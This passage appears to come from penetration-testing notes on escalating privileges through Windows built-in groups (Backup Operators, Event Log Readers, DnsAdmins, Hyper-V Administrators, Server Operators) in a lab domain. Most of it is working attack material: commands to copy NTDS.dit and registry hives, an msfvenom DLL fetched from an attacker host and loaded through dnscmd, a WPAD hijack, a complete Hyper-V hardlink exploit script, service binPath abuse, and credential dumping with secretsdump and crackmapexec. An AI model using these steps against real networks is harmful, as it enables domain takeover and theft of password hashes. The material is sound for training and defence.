| SeUndockPrivilege                 | [Remove computer from docking station](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_38)                           |
| SeAssignPrimaryTokenPrivilege     | [Replace a process level token](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_39)                                  |
| SeRestorePrivilege                | [Restore files and directories](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_40)                                  |
| SeShutdownPrivilege               | [Shut down the system](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_41)                                           |
| SeSyncAgentPrivilege              | [Synchronize directory service data](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_42)                             |
| SeTakeOwnershipPrivilege          | [Take ownership of files or other objects](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd349804\(v=ws.10\)#BKMK_43)                       |

[Microsoft reference](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory#permissions)


## What are my privileges

Show our current group memberships:

```powershell
whoami /groups
```

## Backup Operators Group

### Abusing SeBackupPrivilege

If we are members of the [Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators) group, we will be given the `SeBackup` and `SeRestore` privileges. The [SeBackupPrivilege](https://docs.microsoft.com/en-us/windows-hardware/drivers/ifs/privileges) allows us to traverse any folder and list the folder contents.

In order to exploit `SeBackupPrivilege` you have to:

- Enable the privilege.  
    This alone lets you traverse (`cd` into) any1 directory, local or remote, and list (`dir`, `Get-ChildItem`) its contents.
- If you want to read/copy data out of a "normally forbidden" folder, you have to act as a backup software. The shell `copy` command won't work; you'll need to open the source file manually using `CreateFile` making sure to specify the `FILE_FLAG_BACKUP_SEMANTICS` flag.

We will use this PoC: [https://github.com/giuliano108/SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege) 

```
git clone https://github.com/giuliano108/SeBackupPrivilege.git
# Library fileds are located at /SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug
```

**1.** Open Powershell in the target machine, copy the library binaries and import the required libraries:

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
import-Module .\SeBackupPrivilegeCmdLets.dll
```

**2.** Check privs and group memberships:

```powershell
whoami /priv
whoami /groups
```

**3.** If SeBackupPrivilege is present, double check if it is enabled:

```powershell
Get-SeBackupPrivilege
```

**4.** If disabled, enable it (and check it back):

```powershell
Set-SeBackupPrivilege
Get-SeBackupPrivilege
whoami /priv
```

**5.** Now the privilege is  enabled and it can be now leveraged to copy any protected file (not to read it).

```powershell-session
dir C:\Confidential\
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
cat 'C:\Confidential\2021 Contract.txt'
```


### Abusing the local logging to a domain controller with diskshadow

This group also permits logging in locally to a domain controller. The active directory database `NTDS.dit` is a very attractive target, as it contains the NTLM hashes for all user and computer objects in the domain. 

**1.** As the `NTDS.dit` file is locked by default, we can use the Windows [diskshadow](diskshadow.md) utility to create a shadow copy of the `C` drive and expose it as `E` drive. The NTDS.dit in this shadow copy won't be in use by the system.ll

```powershell
diskshadow.exe

Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC,  10/14/2020 12:57:52 AM

DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit

dir E:
```


**2.** Next, we can use the `Copy-FileSeBackupPrivilege` cmdlet to bypass the ACL and copy the NTDS.dit locally.

```powershell-session
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

See [Attacking sam](attacking-sam.md) and [Attacking ntds](attacking-ntds.md) for extracting the credentials.


### Backing up SAM and SYSTEM Registry Hives

The SeBackupPrivilege also lets us back up the SAM and SYSTEM registry hives:

```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

With this, we can extract local account credentials offline using a tool such as Impacket's `secretsdump.py`.

**See more techniques at the [Attacking sam](attacking-sam.md) and [Attacking ntds](attacking-ntds.md) pages, both for extracting the hives and then also for cracking the credentials,** for instance:

- Alternative #1: vssadmin (locally)
- Alternative #2: crackmapexec (remotely)
- Alternative #3:  `DSInternals` module (locally)
- Alternative #4: Robocopy (locally)


##  Event Log Readers 

Administrators or members of the [Event Log Readers](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\)?redirectedfrom=MSDN#event-log-readers) group have access to the Windows security event log, which saves the event ID [4688: A new process has been created](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688). This is used for monitoring commands being run, such as `tasklist`, `ver`, `ipconfig`, `systeminfo`, typical commands used by attackers, or blocking access.

Very often members of the [Event Log Readers](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\)?redirectedfrom=MSDN#event-log-readers) group have permission to  perform certain tasks without having to grant them administrative access.

Checking out our privileges:

```
# Confirming Group Membership
net localgroup "Event Log Readers"

# Also
whoami /groups
```

### wevtutil

Searching Security Logs Using wevtutil (Windows Event Utility, used for querying and managing event logs):

```powershell-session
wevtutil qe Security /rd:true /f:text | Select-String "/user"
# qe Security → Queries the Security event log.
# /rd:true → Reads events in reverse order (starting from the most recent).
# /f:text  → Formats the output in plain text (instead of XML or JSON).
# | Select-String "/user" → Pipes (`|`) the output to `Select-String`, which **searches for lines containing** `"/user"`.


# We can also specify alternate credentials for wevtutil using the parameters /u and /p.
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```


### Get-WinEvent 

We can also use the Get-WinEvent PowerShell cmdlet. In this example, we filter for process creation events (4688), which contain `/user` in the process command line.

```powershell
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

The cmdlet can also be run as another user with the `-Credential` parameter.

### Abusing Powershell Operational

Other logs include [PowerShell Operational](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.1) log, which may also contain sensitive information or credentials if script block or module logging is enabled. This log is accessible to unprivileged users.

## DnsAdmins

Members of the [DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins) group have access to DNS information on the network. The Windows DNS service supports custom plugins and can call functions from them to resolve name queries that are not in the scope of any locally hosted DNS zones. 

The DNS service runs as `NT AUTHORITY\SYSTEM`, so membership in this group could potentially be leveraged to escalate privileges on a Domain Controller.

The attack in a nugshell (from the blog [https://adsecurity.org/?p=4064](https://adsecurity.org/?p=4064) and "[Feature, not bug: DNSAdmin to DC compromise in one line](https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83)"):

- By default, domain controllers are also DNS servers; DNS servers need to be reachable and usable by mostly every domain user. 
- The protocol’s implementation may allow, under some circumstances, to run code as SYSTEM on domain controllers, without being a domain admin. So, how is this possible?
	- DNS management is performed over RPC.
	- [ServerLevelPluginDll](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to load a custom DLL with zero verification of the DLL's path. This can be done with the `dnscmd` tool from the command line
	- When a member of the `DnsAdmins` group runs the `dnscmd` command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated.
	- When the DNS service is restarted, the DLL in this path will be loaded (i.e., a network share that the Domain Controller's machine account can access)
	- An attacker can load a custom DLL to obtain a reverse shell or even load a tool such as Mimikatz as a DLL to dump credentials.

### Using msfvenon

**1.** Generating Malicious DLL to add a user to the domain admins group using msfvenom from your attacking machine:

```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

**2.** Starting Local HTTP Server: 

```shell-session
python3 -m http.server 7777
```

**3.** Downloading File to Target machine:

```powershell-session
 wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
```

**4.** Loading this DLL as a normal user isn't successful. Only members of the `DnsAdmins` group are permitted to do this. 

```powershell
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

**5.** With the registry setting containing the path of our malicious plugin configured, and our payload created, the DLL will be loaded the next time the DNS service is started. Membership in the DnsAdmins group doesn't give the ability to restart the DNS service. If we do not have access to restart the DNS server, we will have to wait until the server or service restarts. Let's check our current user's permissions on the DNS service.

```
# Finding our user's SID
wmic useraccount where name="netadm" get sid

# Once we have the user's SID, we can use the sc command to check permissions on the service. If we see our SID in the output we can determine to which services our user has access:
sc.exe sdshow DNS
```

Example of an output:

```cmd-session
D:(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;RPWP;;;S-1-5-21-669053619-2741956077-1013132368-1109)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)
```

**6.** Stopping and starting the DNS Service

```powershell
sc.exe stop dns
sc.exe start dns
```

**7.** Confirming Group Membership

```powershell
net group "Domain Admins" /dom
```

**8.** **However, your session is still running at `Medium Mandatory Level`**, which indicates you haven’t fully inherited the **Domain Admin** privileges yet.

```powershell
logoff
```

And when you connect back, you will be Domain Admin.

**9.** Cleaning up:

```powershell
# The first step is confirming that the ServerLevelPluginDll registry key exists. 
reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters

# Deleting Registry Key
reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters  /v ServerLevelPluginDll

# Starting the DNS Service Again
sc.exe start dns
 
# Checking DNS Service Status
sc.exe query dns
```


### Using Mimilib.dll

As detailed in this [post](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), we could also utilize [mimilib.dll](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) from the creator of the `Mimikatz` tool to gain command execution by modifying the [kdns.c](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) file to execute a reverse shell one-liner or another command of our choosing.

```C
```c
/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kdns.h"

DWORD WINAPI kdns_DnsPluginInitialize(PLUGIN_ALLOCATOR_FUNCTION pDnsAllocateFunction, PLUGIN_FREE_FUNCTION pDnsFreeFunction)
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginCleanup()
{
	return ERROR_SUCCESS;
}

DWORD WINAPI kdns_DnsPluginQuery(PSTR pszQueryName, WORD wQueryType, PSTR pszRecordOwnerName, PDB_RECORD *ppDnsRecordListHead)
{
	FILE * kdns_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if(kdns_logfile = _wfopen(L"kiwidns.log", L"a"))
#pragma warning(pop)
	{
		klog(kdns_logfile, L"%S (%hu)\n", pszQueryName, wQueryType);
		fclose(kdns_logfile);
	    system("ENTER COMMAND HERE");
	}
	return ERROR_SUCCESS;
}
```


### Creating a WPAD Record

Another way to abuse DnsAdmins group privileges is by creating a WPAD record. Membership in this group gives us the rights to [disable global query block security](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps), which by default blocks this attack. Server 2008 first introduced the ability to add to a global query block list on a DNS server. By default, Web Proxy Automatic Discovery Protocol (WPAD) and Intra-site Automatic Tunnel Addressing Protocol (ISATAP) are on the global query block list. These protocols are quite vulnerable to hijacking, and any domain user can create a computer object or DNS record containing those names.

After disabling the global query block list and creating a WPAD record, every machine running WPAD with default settings will have its traffic proxied through our attack machine. We could use a tool such as [Responder](https://github.com/lgandx/Responder) or [Inveigh](https://github.com/Kevin-Robertson/Inveigh) to perform traffic spoofing, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.


**1.** To set up this attack, we first disabled the global query block list:

```powershell-session
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```

**2.** Next, we add a WPAD record pointing to our attack machine.

```powershell-session
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```


## Hyper-V Administrators

The [Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators) group has full access to all [Hyper-V features](https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines). If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins. They could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain.

References:

- [From Hyper-V Admin to SYSTEM](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/)

It is also well documented on this [blog](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/), that upon deleting a virtual machine, `vmms.exe` attempts to restore the original file permissions on the corresponding `.vhdx` file and does so as `NT AUTHORITY\SYSTEM`, without impersonating the user. We can delete the `.vhdx` file and create a native hard link to point this file to a protected SYSTEM file, which we will have full permissions to.

If the operating system is vulnerable to [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) or [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841), we can leverage this to gain SYSTEM privileges. Otherwise, we can try to take advantage of an application on the server that has installed a service running in the context of SYSTEM, which is startable by unprivileged users.


**1.** **Target File**: An example of this is Firefox, which installs the `Mozilla Maintenance Service`. We can update [this exploit](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) (a proof-of-concept for NT hard link) to grant our current user full permissions on the file below:

hyperv-eop.ps1:

```powershell
## Hyper-V EOP via hardlink
## @decoder_it & @padovah4ck
function Native-HardLink {
<#
.SYNOPSIS
	This is a proof-of-concept for NT hard links. There are some advantages, from an offensive
	perspective, to using NtSetInformationFile to create hard links (as opposed to
	mklink/CreateHardLink). NtSetInformationFile allows us link to files we donâ€™t have write
	access to. In the script I am performing some steps which are not strictly speaking
	necessary, like using GetFullPathName for path resolution, I have done this mostly to
	educate myself.

	Be smart, you can create a hard linkâ€™s which you wonâ€™t be able to delete afterwards donâ€™t
	shoot yourself in the foot.

	Resources:
		- https://github.com/google/symboliclink-testing-tools
		- https://googleprojectzero.blogspot.com/2015/12/between-rock-and-hard-link.html

.DESCRIPTION
	Author: Ruben Boonen (@FuzzySec)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None

.PARAMETER Link
	The full path to hard link.

.PARAMETER Target
	The full path to the file we are linking to.

.EXAMPLE
	C:\PS> Native-HardLink -Link C:\Some\Path\Hard.Link -Target C:\Some\Path\Target.file
	True
#>

	[CmdletBinding()]
	param(
		[Parameter(Mandatory = $True)]
		[String]$Link,
		[Parameter(Mandatory = $True)]
		[String]$Target
	)

	# Native API Definitions
	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;

	[StructLayout(LayoutKind.Sequential)]
	public struct OBJECT_ATTRIBUTES
	{
		public Int32 Length;
		public IntPtr RootDirectory;
		public IntPtr ObjectName;
		public UInt32 Attributes;
		public IntPtr SecurityDescriptor;
		public IntPtr SecurityQualityOfService;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct IO_STATUS_BLOCK
	{
		public IntPtr Status;
		public IntPtr Information;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct UNICODE_STRING
	{
		public UInt16 Length;
		public UInt16 MaximumLength;
		public IntPtr Buffer;
	}

	[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
	public struct FILE_LINK_INFORMATION
	{
		[MarshalAs(UnmanagedType.U1)]
		public bool ReplaceIfExists;
		public IntPtr RootDirectory;
		public UInt32 FileNameLength;
		[MarshalAs(UnmanagedType.ByValTStr,SizeConst=260)]
		public String FileName;
	}

	public static class NtHardLink
	{
		[DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
		public static extern UInt32 GetFullPathName(
			String lpFileName,
			UInt32 nBufferLength,
			System.Text.StringBuilder lpBuffer,
			ref IntPtr FnPortionAddress);

		[DllImport("kernel32.dll")]
		public static extern bool CloseHandle(
			IntPtr hObject);

		[DllImport("ntdll.dll")]
		public static extern UInt32 NtOpenFile(
			ref IntPtr FileHandle,
			UInt32 DesiredAccess,
			ref OBJECT_ATTRIBUTES ObjAttr,
			ref IO_STATUS_BLOCK IoStatusBlock,
			UInt32 ShareAccess,
			UInt32 OpenOptions);

		[DllImport("ntdll.dll")]
		public static extern UInt32 NtSetInformationFile(
			IntPtr FileHandle,
			ref IO_STATUS_BLOCK IoStatusBlock,
			IntPtr FileInformation,
			UInt32 Length,
			UInt32 FileInformationClass);
	}
"@

	function Emit-UNICODE_STRING {
		param(
			[String]$Data
		)

		$UnicodeObject = New-Object UNICODE_STRING
		$UnicodeObject_Buffer = $Data
		[UInt16]$UnicodeObject.Length = $UnicodeObject_Buffer.Length*2
		[UInt16]$UnicodeObject.MaximumLength = $UnicodeObject.Length+1
		[IntPtr]$UnicodeObject.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($UnicodeObject_Buffer)
		[IntPtr]$InMemoryStruct = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(16) # enough for x32/x64
		[system.runtime.interopservices.marshal]::StructureToPtr($UnicodeObject, $InMemoryStruct, $true)

		$InMemoryStruct
	}

	function Get-FullPathName {
		param(
			[String]$Path
		)

		$lpBuffer = New-Object -TypeName System.Text.StringBuilder
		$FnPortionAddress = [IntPtr]::Zero

		# Call to get buffer length
		$CallResult = [NtHardLink]::GetFullPathName($Path,1,$lpBuffer,[ref]$FnPortionAddress)

		if ($CallResult -ne 0) {
			# Set buffer length and re-call
			$lpBuffer.EnsureCapacity($CallResult)|Out-Null
			$CallResult = [NtHardLink]::GetFullPathName($Path,$lpBuffer.Capacity,$lpBuffer,[ref]$FnPortionAddress)
			$FullPath = "\??\" + $lpBuffer.ToString()
		} else {
			$FullPath = $false
		}

		# Return FullPath
		$FullPath
	}

	function Get-NativeFileHandle {
		param(
			[String]$Path
		)

		$FullPath = Get-FullPathName -Path $Path
		if ($FullPath) {
			# IO.* does not support full path name on Win7
			if (![IO.File]::Exists($Path)) {
				Write-Verbose "[!] Invalid file path specified.."
				$false
				Return
			}
		} else {
			Write-Verbose "[!] Failed to retrieve fully qualified path.."
			$false
			Return
		}

		# Prepare NtOpenFile params
		[IntPtr]$hFile = [IntPtr]::Zero
		$ObjAttr = New-Object OBJECT_ATTRIBUTES
		$ObjAttr.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($ObjAttr)
		$ObjAttr.ObjectName = Emit-UNICODE_STRING -Data $FullPath
		$ObjAttr.Attributes = 0x40
		$IoStatusBlock = New-Object IO_STATUS_BLOCK

		# DesiredAccess = MAXIMUM_ALLOWED; ShareAccess = FILE_SHARE_READ
		$CallResult = [NtHardLink]::NtOpenFile([ref]$hFile,0x02000000,[ref]$ObjAttr,[ref]$IoStatusBlock,0x1,0x0)
		if ($CallResult -eq 0) {
			$Handle = $hFile
		} else {
			Write-Verbose "[!] Failed to acquire file handle, NTSTATUS($('{0:X}' -f $CallResult)).."
			$Handle = $false
		}

		# Return file handle
		$Handle
	}

	function Create-NtHardLink {
		param(
			[String]$Link,
			[String]$Target
		)

		$LinkFullPath = Get-FullPathName -Path $Link
		# IO.* does not support full path name on Win7
		$LinkParent = [IO.Directory]::GetParent($Link).FullName
		if (![IO.Directory]::Exists($LinkParent)) {
			Write-Verbose "[!] Invalid link folder path specified.."
			$false
			Return
		}
		

		# Create pFileLinkInformation & IOStatusBlock struct
		$FileLinkInformation = New-Object FILE_LINK_INFORMATION
		$FileLinkInformation.ReplaceIfExists = $true
		$FileLinkInformation.FileName = $LinkFullPath
		$FileLinkInformation.RootDirectory = [IntPtr]::Zero
		$FileLinkInformation.FileNameLength = $LinkFullPath.Length * 2
		$FileLinkInformationLen = [System.Runtime.InteropServices.Marshal]::SizeOf($FileLinkInformation)
		$pFileLinkInformation = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($FileLinkInformationLen)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($FileLinkInformation, $pFileLinkInformation, $true)
		$IoStatusBlock = New-Object IO_STATUS_BLOCK

		# Get handle to target
		$hTarget = Get-NativeFileHandle -Path $Target
		if (!$hTarget) {
			$false
			Return
		}

		# FileInformationClass => FileLinkInformation = 0xB
		$CallResult = [NtHardLink]::NtSetInformationFile($hTarget,[ref]$IoStatusBlock,$pFileLinkInformation,$FileLinkInformationLen,0xB)
		if ($CallResult -eq 0) {
			$true
		} else {
			Write-Verbose "[!] Failed to create hardlink, NTSTATUS($('{0:X}' -f $CallResult)).."
		}

		# Free file handle
		$CallResult = [NtHardLink]::CloseHandle($hTarget)
	}

	# Create Hard Link
	Create-NtHardLink -Link $Link -Target $Target
}

$user=$env:UserName
$mypath = "c:\users\$user\documents\"
$targetfile="c:\windows\system32\license.rtf"
echo "[+] Path:$mypath"
$VMName = "testEOP"
$NewVHDPath = $mypath+$VMName+".vhdx"
echo "[+] VHD Disk: $NewVHDPath"

echo "[+] removing disk"
remove-item -force -path $NewVHDPath -erroraction ignore
echo "[+] Creating VM ..."
$a=(Get-VMSwitch)
$VM = @{
     Name = $VMName
     MemoryStartupBytes = 2147483648
     Generation = 2
     NewVHDPath = $NewVHDPath
     NewVHDSizeBytes = 53687091200
     BootDevice = "VHD"
     Path = $mypath
     SwitchName = $a[0].Name
}

New-VM @VM
echo "[+] Done!"
echo "[+] removing disk"
remove-item -force $NewVHDPath
echo "[+] Creating link $NewVHDPath -> $targetfile"
Native-HardLink $NewVHDPath $targetfile 

echo "[+] removing VM"
Remove-VM -force -Name $VMName
echo "[+] New perms on target:"
get-acl $targetfile | fl
```


```powershell
C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```

**2.** **Taking Ownership of the File**: After running the PowerShell script, we should have full control of this file and can take ownership of it.

```powershell
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
```

**3.** **Starting the Mozilla Maintenance Service**: Next, we can replace this file with a malicious `maintenanceservice.exe`, start the maintenance service, and get command execution as SYSTEM.

```powershell
sc.exe start MozillaMaintenance
```

**Note: This vector has been mitigated by the March 2020 Windows security updates, which changed behavior relating to hard links.**


## 🖨️ Print Operators: SeLoadDriverPrivilege

[Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#print-operators) is another highly privileged group, which grants its members the `SeLoadDriverPrivilege`, rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it down.

!!! tip "Note"
	Note: Since Windows 10 Version 1803, the "SeLoadDriverPrivilege" is not exploitable, as it is no longer possible to include references to registry keys under "HKEY_CURRENT_USER".

[See more on SeLoadDriverPrivilege](seloaddriverprivilege.md).


## Server Operators

The [Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators) group allows members to administer Windows servers without needing assignment of Domain Admin privileges. It is a very highly privileged group that can log in locally to servers, including Domain Controllers.

Membership of this group confers the powerful `SeBackupPrivilege` and `SeRestorePrivilege` privileges and the ability to control local services.

Let's examine the AppReadiness service.

>_App Readiness_ gets apps ready for use the first time a user signs in to this PC and when adding new apps.

We can confirm that this service starts as SYSTEM using the sc.exe utility.

```powershell
sc.exe qc AppReadiness
```


**Checking Service Permissions with PsService:** We can use the service viewer/controller [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice), which is part of the Sysinternals suite, to check permissions on the service. `PsService` works much like the `sc` utility and can display service status and configurations and also allow you to start, stop, pause, resume, and restart services both locally and on remote hosts.

```powershell
c:\Tools\PsService.exe security AppReadiness
```

If we see in the output:

```
 [ALLOW] BUILTIN\Server Operators
 ```

This confirms that the Server Operators group has [SERVICE_ALL_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) access right, which gives us full control over this service.

Checking Local Admin Group Membership to confirm that our target account is not present:

```powershell
net localgroup Administrators
```

**Modifying the Service Binary Path**: Let's change the binary path to execute a command which adds our current user to the default local administrators group.

```powershell
sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

**Starting the service fails**, which is expected.

```powershell
sc.exe start AppReadiness
```

**Confirming Local Admin Group Membership**:If we check the membership of the administrators group, we see that the command was executed successfully.

```powershell
net localgroup Administrators
```

**Confirming Local Admin Access on Domain Controller**: From here, we have full control over the Domain Controller and could retrieve all credentials from the NTDS database and access other systems, and perform post-exploitation tasks.

```
crackmapexec smb 10.129.43.42 -u server_adm -p 'HTB_@cademy_stdnt!'
```

Output:

```
SMB         10.129.43.9     445    WINLPE-DC01      [*] Windows 10.0 Build 17763 (name:WINLPE-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.43.9     445    WINLPE-DC01      [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
```


Retrieving NTLM Password Hashes from the Domain Controller:

```bash
secretsdump.py server_adm@10.129.43.42 -just-dc-user administrator
```

Returning all ntdi:

```
crackmapexec smb  10.129.172.26 -u Administrator -H 7796ee39fd3a9c3a1844556115ae1a54 -d INLANEFREIGHT.LOCAL --ntds   
``

